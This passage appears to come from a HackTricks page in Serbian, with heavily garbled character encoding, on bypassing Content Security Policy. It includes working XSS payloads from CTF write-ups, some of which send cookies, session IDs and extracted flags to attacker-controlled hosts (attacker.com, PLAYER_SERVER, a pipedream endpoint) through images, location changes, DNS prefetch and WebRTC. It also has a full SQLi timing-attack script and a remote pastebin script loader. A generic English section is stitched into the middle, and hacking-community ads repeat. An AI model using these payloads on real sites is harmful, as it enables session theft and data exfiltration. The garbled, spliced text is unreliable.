`'unsafe-inline'` znaÄi da moÅ¾ete izvrÅ¡iti bilo koji skript unutar koda (XSS moÅ¾e izvrÅ¡iti kod) i `img-src *` znaÄi da moÅ¾ete koristiti na veb stranici bilo koju sliku sa bilo kog resursa.

Ovu CSP moÅ¾ete zaobiÄ‡i eksfiltriranjem podataka putem slika (u ovom sluÄaju XSS zloupotrebljava CSRF gde stranica dostupna botu sadrÅ¾i SQLi, i izvlaÄi zastavu putem slike):

```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```

Sa ovom konfiguracijom takoÄ‘e moÅ¾ete zloupotrebiti **uÄitavanje JavaScript koda ubaÄenog unutar slike**. Na primer, ako stranica dozvoljava uÄitavanje slika sa Twittera, moÅ¾ete **napraviti** **specijalnu sliku**, **uÄitati** je na Twitter i zloupotrebiti "**unsafe-inline**" da **izvrÅ¡ite** JS kod (kao redovan XSS) koji Ä‡e **uÄitati** sliku, **izvuÄ‡i** JS iz nje i **izvrÅ¡iti** **ga**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Sa Servisnim Radnicima

Funkcija **`importScripts`** servisnih radnika nije ograniÄena CSP-om:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Umetanje Politike

**IstraÅ¾ivanje:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Ako je **parametar** koji ste poslali **zalepljen unutar** **deklaracije** **politike**, tada moÅ¾ete **izmeniti** **politiku** na naÄin koji je **beskoristan**. MoÅ¾ete **dozvoliti skript 'unsafe-inline'** sa bilo kojim od ovih prelaza:

```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```

Zato Å¡to Ä‡e ovaj direktiv **prepisati postojeÄ‡e direktive script-src**.\
Primer moÅ¾ete pronaÄ‡i ovde: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

U Edge-u je mnogo jednostavnije. Ako moÅ¾ete dodati u CSP samo ovo: **`;_`** **Edge** Ä‡e **odbaciti** ceo **policy**.\
Primer: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; putem XSS (iframe) - Napad vremenskim usklaÄ‘ivanjem

Primetite nedostatak direktive `'unsafe-inline'`\
Ovog puta moÅ¾ete naterati Å¾rtvu da **uÄita** stranicu pod **vaÅ¡om kontrolom** putem **XSS** sa `<iframe`. Ovog puta Ä‡ete naterati Å¾rtvu da pristupi stranici sa koje Å¾elite da izvuÄete informacije (**CSRF**). Ne moÅ¾ete pristupiti sadrÅ¾aju stranice, ali ako na neki naÄin moÅ¾ete **kontrolisati vreme koje je potrebno stranici da se uÄita** moÅ¾ete izvuÄ‡i potrebne informacije.

Ovog puta Ä‡e se **flag** izvuÄ‡i, svaki put kada se **karakter taÄno pogodi** putem SQLi, **odgovor** traje **duÅ¾e** zbog sleep funkcije. Tada Ä‡ete moÄ‡i izvuÄ‡i flag:

```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```

### Preko Bookmarkleta

Ovaj napad bi implicirao neko oblik druÅ¡tvenog inÅ¾enjeringa gde napadaÄ **ubeÄ‘uje korisnika da prevuÄe i ispusti link preko bookmarkleta pretraÅ¾ivaÄa**. Ovaj bookmarklet bi sadrÅ¾ao **zlonamerni JavaScript** kod koji bi se izvrÅ¡io u kontekstu trenutnog prozora veba, **zaobilazeÄ‡i CSP i omoguÄ‡avajuÄ‡i kraÄ‘u osetljivih informacija** poput kolaÄiÄ‡a ili tokena.

Za viÅ¡e informacija [**proverite originalni izveÅ¡taj ovde**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### ZaobilaÅ¾enje CSP-a ograniÄavanjem CSP-a

U [**ovom CTF izveÅ¡taju**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP je zaobiÄ‘en ubacivanjem unutar dozvoljenog iframe-a stroÅ¾iji CSP koji nije dozvoljavao uÄitavanje odreÄ‘ene JS datoteke koja je zatim, putem **zagaÄ‘enja prototipa** ili **dom clobbering-a**, omoguÄ‡ila **zloupotrebu drugog skripta za uÄitavanje proizvoljnog skripta**.

MoÅ¾ete **ograniÄiti CSP Iframe-a** pomoÄ‡u atributa **`csp`**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

U [**ovom CTF zapisu**](https://github.com/aszx87410/ctf-writeups/issues/48), bilo je moguÄ‡e putem **HTML ubacivanja** dodatno **ograniÄiti** **CSP** tako da je skripta koja spreÄava CSTI bila onemoguÄ‡ena i stoga je **ranjivost postala iskoristiva.**\
CSP moÅ¾e postati stroÅ¾i koriÅ¡Ä‡enjem **HTML meta tagova** i inline skripte mogu biti onemoguÄ‡ene **uklanjanjem** **unosa** koji omoguÄ‡ava njihov **nonce** i **omoguÄ‡avanje specifiÄne inline skripte putem sha**:

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```

### JS ekstrakcija pomoÄ‡u Content-Security-Policy-Report-Only

Ako uspete da naterate server da odgovori sa zaglavljem **`Content-Security-Policy-Report-Only`** sa **vrednoÅ¡Ä‡u kojom upravljate vi** (moÅ¾da zbog CRLF-a), moÅ¾ete ga naterati da upuÄ‡uje ka vaÅ¡em serveru i ako **obavijete** **JS sadrÅ¾aj** koji Å¾elite da ekstrahujete sa **`<script>`** i jer je veoma verovatno da `unsafe-inline` nije dozvoljen od strane CSP-a, ovo Ä‡e **pokrenuti CSP greÅ¡ku** i deo skripte (koji sadrÅ¾i osetljive informacije) Ä‡e biti poslat na server iz `Content-Security-Policy-Report-Only`.

Za primer [**proverite ovaj CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)

```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```

### Otkrivanje informacija pomoÄ‡u CSP i Iframe-a

* Kreira se `iframe` koji pokazuje ka URL-u (nazovimo ga `https://example.redirect.com`) koji je dozvoljen od strane CSP-a.
* Taj URL zatim preusmerava ka tajnom URL-u (npr. `https://usersecret.example2.com`) koji **nije dozvoljen** od strane CSP-a.
* SluÅ¡anjem dogaÄ‘aja `securitypolicyviolation`, moguÄ‡e je uhvatiti svojstvo `blockedURI`. Ovo svojstvo otkriva domen blokiranog URI-ja, otkrivajuÄ‡i tajni domen ka kojem je prvobitni URL preusmeren.

Zanimljivo je napomenuti da pregledaÄi poput Chrome-a i Firefox-a imaju razliÄito ponaÅ¡anje u rukovanju iframe-ovima u vezi sa CSP-om, Å¡to moÅ¾e dovesti do potencijalnog otkrivanja osetljivih informacija zbog nedefinisanog ponaÅ¡anja.

Druga tehnika ukljuÄuje iskoriÅ¡Ä‡avanje samog CSP-a kako bi se zakljuÄio tajni poddomen. Ova metoda se oslanja na binarnu pretragu i prilagoÄ‘avanje CSP-a kako bi ukljuÄila odreÄ‘ene domene koji su namerno blokirani. Na primer, ako tajni poddomen sadrÅ¾i nepoznate karaktere, moÅ¾ete iterativno testirati razliÄite poddomene modifikujuÄ‡i CSP direktivu da blokira ili dozvoljava ove poddomene. Evo iseÄka koji prikazuje kako bi CSP mogao biti podeÅ¡en da olakÅ¡a ovu metodu:

```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```

PrateÄ‡i koje zahteve CSP blokira ili dozvoljava, moguÄ‡e je suziti moguÄ‡e karaktere u tajnom poddomenu, otkrivajuÄ‡i konaÄno celu URL adresu.

Oba metoda iskoriÅ¡Ä‡avaju nijanse implementacije i ponaÅ¡anja CSP-a u pregledaÄima, pokazujuÄ‡i kako se naizgled sigurne politike mogu nenamerno otkriti osetljive informacije.

Triks sa [**ovde**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Hakerski uvidi**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Vesti o hakovanju u realnom vremenu**\
Budite u toku sa dinamiÄnim svetom hakovanja putem vesti i uvida u realnom vremenu

**Poslednje najave**\
Budite informisani o najnovijim nagradama za pronalaÅ¾enje bagova i vaÅ¾nim aÅ¾uriranjima platformi

**PridruÅ¾ite nam se na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

## Nesigurne tehnologije za zaobilaÅ¾enje CSP-a

### PreoptereÄ‡enje PHP odgovora baferom

PHP je poznat po **baferovanju odgovora do 4096** bajtova po podrazumevanim podeÅ¡avanjima. Stoga, ako PHP prikazuje upozorenje, pruÅ¾anjem **dovoljno podataka unutar upozorenja**, **odgovor** Ä‡e biti **poslat** **pre** **CSP zaglavlja**, Å¡to dovodi do ignorisanja zaglavlja.\
Zatim, tehnika se uglavnom sastoji u **popunjavanju bafera odgovora upozorenjima** kako bi CSP zaglavlje bilo poslato.

Ideja sa [**ovog writeupa**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Prepravljanje stranice sa greÅ¡kom

Iz [**ovog writeupa**](https://blog.ssrf.kr/69) izgleda da je bilo moguÄ‡e zaobiÄ‡i CSP zaÅ¡titu uÄitavanjem stranice sa greÅ¡kom (potencijalno bez CSP-a) i prepravljanjem njenog sadrÅ¾aja.

```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```

### SOME + 'self' + wordpress

SOME je tehnika koja zloupotrebljava XSS (ili veoma ograniÄen XSS) **na kraju stranice** da bi **zloupotrebila** **druge krajnje taÄke istog porekla.** Ovo se postiÅ¾e uÄitavanjem ranjive krajnje taÄke sa stranice napadaÄa, a zatim osveÅ¾avanjem stranice napadaÄa do prave krajnje taÄke u istom poreklu koju Å¾elite zloupotrebiti. Na ovaj naÄin, **ranjiva krajnja taÄka** moÅ¾e koristiti **`opener`** objekat u **payload-u** da bi **pristupila DOM-u** **prave krajnje taÄke koju Å¾elite zloupotrebiti.** Za viÅ¡e informacija pogledajte:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Å taviÅ¡e, **wordpress** ima **JSONP** krajnju taÄku u `/wp-json/wp/v2/users/1?_jsonp=data` koja Ä‡e **reflektovati** **podatke** poslate u izlazu (sa ograniÄenjem samo slova, brojeva i taÄaka).

NapadaÄ moÅ¾e zloupotrebiti tu krajnju taÄku da bi **izveo SOME napad** na WordPress i **ugradio** ga unutar `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` obratite paÅ¾nju da Ä‡e se ovaj **script** **uÄitati** jer je **dozvoljen od strane 'self'**. Å taviÅ¡e, i zbog toga Å¡to je WordPress instaliran, napadaÄ moÅ¾e zloupotrebiti **SOME napad** putem **ranjive** **callback** krajnje taÄke koja **zaobilazi CSP** da bi dao viÅ¡e privilegija korisniku, instalirao novi dodatak...\
Za viÅ¡e informacija o tome kako izvesti ovaj napad pogledajte [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## Bypass-ovi CSP eksfiltracije

Ako postoji strogi CSP koji vam ne dozvoljava da **interaktujete sa eksternim serverima**, postoje neke stvari koje uvek moÅ¾ete uraditi da eksfiltrirate informacije.

### Lokacija

MoÅ¾ete jednostavno aÅ¾urirati lokaciju da poÅ¡aljete tajne informacije napadaÄkom serveru:

```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```

### Meta tag

MoÅ¾ete preusmeriti ubacivanjem meta oznake (ovo je samo preusmeravanje, neÄ‡e procuriti sadrÅ¾aj)

```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```

### DNS Prefetch

Da biste uÄitali stranice brÅ¾e, pretraÅ¾ivaÄi Ä‡e unapred reÅ¡avati imena hostova u IP adrese i keÅ¡irati ih za kasniju upotrebu.\
MoÅ¾ete naznaÄiti pretraÅ¾ivaÄu da unapred reÅ¡ava ime hosta sa: `<link rel="dns-prefetch" href="something.com">`

MoÅ¾ete zloupotrebiti ovaj postupak da biste **eksfiltrirali osetljive informacije putem DNS zahteva**:

```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```

## Bypassing Content Security Policy (CSP)

***

### Introduction

Content Security Policy (CSP) is a security standard that helps prevent cross-site scripting (XSS), clickjacking, and other code injection attacks by allowing web developers to control resources the browser is allowed to load for a specific page. However, misconfigurations or weak policies can sometimes allow attackers to bypass CSP protections.

### Bypass Techniques

#### 1. Inline Scripts

When a CSP allows `'unsafe-inline'` for scripts, attackers can execute arbitrary code by injecting inline scripts directly into HTML elements.

#### 2. External Scripts

If a CSP permits loading scripts from specific domains (`'script-src'`), attackers can host malicious scripts on those domains to bypass CSP restrictions.

#### 3. Data URI

Attackers can use data URIs to embed code directly into HTML or CSS files, bypassing CSP restrictions on loading external resources.

#### 4. Eval Function

By using the `eval()` function or similar dynamic code execution methods, attackers can execute code despite CSP restrictions against inline scripts.

#### 5. Nonces

If a CSP uses nonces for script elements, attackers can try to guess or brute force the nonce value to inject and execute malicious scripts.

### Conclusion

Content Security Policy is a powerful security measure, but it's essential to configure it correctly to avoid unintended vulnerabilities. Regularly review and update your CSP to ensure it provides robust protection against code injection attacks.

```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```

Da biste spreÄili da se ovo desi, server moÅ¾e poslati HTTP zaglavlje:

```
X-DNS-Prefetch-Control: off
```

{% hint style="info" %}
OÄigledno, ova tehnika ne funkcioniÅ¡e u headless pregledaÄima (botovima)
{% endhint %}

### WebRTC

Na nekoliko stranica moÅ¾ete proÄitati da **WebRTC ne proverava `connect-src` politiku** CSP-a.

Zapravo, moÅ¾ete _procureti_ informacije koristeÄ‡i _DNS zahtev_. Pogledajte ovaj kod:

```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```

Druga opcija:

```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```

## Provera CSP politika online

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Automatsko kreiranje CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Reference

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

â€‹

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Uvidi u hakovanje**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Vesti o hakovanju u realnom vremenu**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Poslednje najave**\
Budite informisani o najnovijim nagradama za pronalaÅ¾enje bagova i vaÅ¾nim aÅ¾uriranjima platforme

**PridruÅ¾ite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

<details>

<summary><strong>NauÄite hakovanje AWS-a od poÄetnika do struÄnjaka sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
